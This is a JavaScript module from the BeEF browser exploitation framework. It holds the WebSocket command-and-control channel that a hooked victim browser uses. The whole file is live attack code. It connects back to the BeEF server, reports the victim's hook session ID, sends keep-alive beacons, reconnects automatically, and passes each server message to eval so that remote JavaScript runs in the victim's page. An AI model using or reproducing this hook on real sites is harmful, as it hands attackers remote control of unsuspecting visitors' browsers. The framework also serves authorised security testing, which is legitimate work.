//
// Copyright (c) 2006-2012 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


//beef.websocket.socket.send(take answer to server beef)
/*New browser init call this */

beef.websocket = {

    socket:null,
    alive_timer:<%= @websocket_timer %>,

    init:function () {
        var webSocketServer = beef.net.host;
        var webSocketPort = <%= @websocket_port %>;
        var webSocketSecure = <%= @websocket_secure %>;
        var protocol = "ws://";
        //console.log("We are inside init");
        /*use wss only if hooked domain is under https. Mixed-content in WS is quite different from a non-WS context*/
        if(webSocketSecure && window.location.protocol=="https:"){
            protocol = "wss://";
        webSocketPort= <%= @websocket_sec_port %>;
        }

    if (beef.browser.isFF() && !!window.MozWebSocket) {
        beef.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");

        } else {
        beef.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
        }

    },
    /* send Helo message to the BeEF server and start async communication*/
    start:function () {
        new beef.websocket.init();
        this.socket.onopen = function () {
        //console.log("Socket has been opened!");

        /*send browser id*/
        beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
            //console.log("Connected and Helo");
            beef.websocket.alive();
        }
        this.socket.onmessage = function (message) {
            //console.log("Received message via WS."+ message.data);
            eval(message.data);
        }

        this.socket.onclose = function () {
        setTimeout(function(){beef.websocket.start()}, 5000);
        }

    },

    send:function (data) {
        try {
        this.socket.send(data);
        //console.log("Sent [" + data + "]");
         }
         catch(err){
         //console.log(err);

         }
    },

    alive: function (){
        beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
//        console.log("sent alive");
        setTimeout("beef.websocket.alive()", beef.websocket.alive_timer);

    }
};

beef.regCmp('beef.websocket');